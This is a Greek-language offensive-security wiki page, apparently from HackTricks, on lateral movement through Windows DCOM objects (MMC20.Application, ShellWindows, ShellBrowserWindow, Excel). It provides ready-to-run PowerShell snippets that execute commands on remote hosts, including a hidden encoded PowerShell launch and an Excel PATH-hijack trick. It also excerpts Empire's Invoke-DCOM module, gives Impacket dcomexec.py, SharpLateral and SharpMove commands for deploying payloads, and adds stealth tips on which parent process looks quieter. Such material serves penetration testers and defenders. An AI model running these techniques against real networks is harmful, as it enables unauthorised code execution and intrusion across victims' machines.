# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Η lateral movement μέσω DCOM είναι ελκυστική επειδή επαναχρησιμοποιεί υπάρχοντες COM servers που εκτίθενται μέσω RPC/DCOM αντί να δημιουργεί service ή scheduled task. Στην πράξη αυτό σημαίνει ότι η αρχική σύνδεση συνήθως ξεκινά στο TCP/135 και μετά μετακινείται σε δυναμικά αποδιδόμενες high RPC ports.

## Prerequisites & Gotchas

- Συνήθως χρειάζεστε local administrator context στο target και ο remote COM server πρέπει να επιτρέπει remote launch/activation.
- Από τις **14 Μαρτίου 2023**, η Microsoft επιβάλλει DCOM hardening για υποστηριζόμενα συστήματα. Παλιοί clients που ζητούν low activation authentication level μπορεί να αποτύχουν εκτός αν διαπραγματευτούν τουλάχιστον `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Οι σύγχρονοι Windows clients συνήθως αναβαθμίζονται αυτόματα, οπότε τα τρέχοντα tools συνήθως συνεχίζουν να λειτουργούν.
- Η χειροκίνητη ή scripted DCOM execution συνήθως χρειάζεται TCP/135 plus το dynamic RPC port range του target. Αν χρησιμοποιείτε το `dcomexec.py` του Impacket και θέλετε να επιστρέψει command output, συνήθως χρειάζεστε επίσης SMB access στο `ADMIN$` (ή σε άλλο writable/readable share).
- Αν το RPC/DCOM λειτουργεί αλλά το SMB είναι blocked, το `dcomexec.py -nooutput` μπορεί να είναι ακόμα χρήσιμο για blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, δείτε το αρχικό post από [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Τα αντικείμενα Distributed Component Object Model (DCOM) προσφέρουν μια ενδιαφέρουσα δυνατότητα για δικτυακές αλληλεπιδράσεις με αντικείμενα. Η Microsoft παρέχει πλήρη τεκμηρίωση τόσο για το DCOM όσο και για το Component Object Model (COM), διαθέσιμη [εδώ για το DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) και [εδώ για το COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Μια λίστα με εφαρμογές DCOM μπορεί να ανακτηθεί χρησιμοποιώντας την εντολή PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Το COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), επιτρέπει scripting των λειτουργιών MMC snap-in. Συγκεκριμένα, αυτό το object περιέχει μια μέθοδο `ExecuteShellCommand` κάτω από το `Document.ActiveView`. Περισσότερες πληροφορίες για αυτή τη μέθοδο μπορείτε να βρείτε [εδώ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Δείτε το να εκτελείται:

Αυτή η δυνατότητα διευκολύνει την εκτέλεση εντολών μέσω δικτύου μέσω μιας DCOM application. Για αλληλεπίδραση με DCOM απομακρυσμένα ως admin, το PowerShell μπορεί να χρησιμοποιηθεί ως εξής:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Αυτή η εντολή συνδέεται στην εφαρμογή DCOM και επιστρέφει μια instance του COM object. Στη συνέχεια μπορεί να κληθεί η μέθοδος ExecuteShellCommand για να εκτελέσει μια process στον απομακρυσμένο host. Η process περιλαμβάνει τα ακόλουθα βήματα:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Λάβετε RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Το τελευταίο όρισμα είναι το window style. Το `7` κρατά το παράθυρο ελαχιστοποιημένο. Λειτουργικά, η εκτέλεση με βάση το MMC συνήθως οδηγεί σε μια απομακρυσμένη διεργασία `mmc.exe` να εκκινεί το payload σου, κάτι που διαφέρει από τα Explorer-backed objects παρακάτω.

## ShellWindows & ShellBrowserWindow

**Για περισσότερες πληροφορίες σχετικά με αυτή την τεχνική, δες το αρχικό post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Το object **MMC20.Application** εντοπίστηκε ότι δεν έχει explicit "LaunchPermissions," και προεπιλέγει permissions που επιτρέπουν πρόσβαση στους Administrators. Για περισσότερες λεπτομέρειες, μπορείς να δεις ένα thread [εδώ](https://twitter.com/tiraniddo/status/817532039771525120), και συνιστάται η χρήση του [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET για φιλτράρισμα objects χωρίς explicit Launch Permission.

Δύο συγκεκριμένα objects, `ShellBrowserWindow` και `ShellWindows`, επισημάνθηκαν λόγω της έλλειψης explicit Launch Permissions. Η απουσία καταχώρησης `LaunchPermission` στο registry under `HKCR:\AppID\{guid}` σημαίνει ότι δεν υπάρχουν explicit permissions.

Σε σύγκριση με το `MMC20.Application`, αυτά τα objects είναι συχνά πιο αθόρυβα από πλευράς OPSEC, επειδή η εντολή συνήθως καταλήγει ως child του `explorer.exe` στο remote host αντί για `mmc.exe`.

### ShellWindows

Για το `ShellWindows`, το οποίο δεν έχει ProgID, οι .NET methods `Type.GetTypeFromCLSID` και `Activator.CreateInstance` διευκολύνουν την instantiation του object χρησιμοποιώντας το AppID του. Αυτή η διαδικασία αξιοποιεί το OleView .NET για να ανακτήσει το CLSID για το `ShellWindows`. Μόλις γίνει instantiation, η αλληλεπίδραση είναι δυνατή μέσω της μεθόδου `WindowsShell.Item`, οδηγώντας σε method invocation όπως `Document.Application.ShellExecute`.

Παραδείγματα PowerShell commands δόθηκαν για να γίνει instantiation του object και να εκτελεστούν εντολές απομακρυσμένα:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

Το `ShellBrowserWindow` είναι παρόμοιο, αλλά μπορείς να το instantiate απευθείας μέσω του CLSID του και να κάνεις pivot στο `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Πλευρική Μετακίνηση με Excel DCOM Objects

Η lateral movement μπορεί να επιτευχθεί εκμεταλλευόμενη DCOM Excel objects. Για λεπτομερείς πληροφορίες, είναι σκόπιμο να διαβάσετε τη συζήτηση για το leveraging Excel DDE για lateral movement μέσω DCOM στο [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Το project Empire παρέχει ένα PowerShell script, το οποίο δείχνει τη χρήση του Excel για remote code execution (RCE) με χειρισμό DCOM objects. Παρακάτω υπάρχουν αποσπάσματα από το script που είναι διαθέσιμο στο [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), τα οποία παρουσιάζουν διαφορετικές μεθόδους για να abuse το Excel για RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Πρόσφατη έρευνα επέκτεινε αυτή την περιοχή με τη μέθοδο `ActivateMicrosoftApp()` του `Excel.Application`. Η βασική ιδέα είναι ότι το Excel μπορεί να προσπαθήσει να εκκινήσει legacy Microsoft applications όπως το FoxPro, το Schedule Plus ή το Project, αναζητώντας στο σύστημα το `PATH`. Αν ένας operator μπορεί να τοποθετήσει ένα payload με ένα από αυτά τα αναμενόμενα ονόματα σε ένα writable location που αποτελεί μέρος του `PATH` του target, το Excel θα το εκτελέσει.

Requirements για αυτήν τη variation:

- Local admin στο target
- Excel εγκατεστημένο στο target
- Δυνατότητα εγγραφής ενός payload σε writable directory στο `PATH` του target

Practical example abusing the FoxPro lookup (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Εάν ο επιτιθέμενος host δεν έχει καταχωρημένο το τοπικό `Excel.Application` ProgID, κάνε instantiate το remote object μέσω CLSID αντί γι’ αυτό:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Τιμές που έχουν παρατηρηθεί να καταχρώνται στην πράξη:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Εργαλεία αυτοματοποίησης για lateral movement

Δύο εργαλεία επισημαίνονται για την αυτοματοποίηση αυτών των τεχνικών:

- **Invoke-DCOM.ps1**: Ένα PowerShell script που παρέχεται από το Empire project και απλοποιεί την κλήση διαφορετικών μεθόδων για την εκτέλεση code σε απομακρυσμένα machines. Αυτό το script είναι διαθέσιμο στο Empire GitHub repository.

- **SharpLateral**: Ένα tool σχεδιασμένο για την απομακρυσμένη εκτέλεση code, το οποίο μπορεί να χρησιμοποιηθεί με την εντολή:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Αυτόματα Εργαλεία

- Το Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) επιτρέπει να καλέσετε εύκολα όλους τους σχολιασμένους τρόπους για να εκτελέσετε code σε άλλες μηχανές.
- Μπορείτε να χρησιμοποιήσετε το `dcomexec.py` του Impacket για να εκτελέσετε commands σε απομακρυσμένα systems χρησιμοποιώντας DCOM. Οι τρέχουσες εκδόσεις υποστηρίζουν `ShellWindows`, `ShellBrowserWindow`, και `MMC20`, και ως προεπιλογή χρησιμοποιούν το `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Θα μπορούσες επίσης να χρησιμοποιήσεις [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Μπορείτε επίσης να χρησιμοποιήσετε [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Αναφορές

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
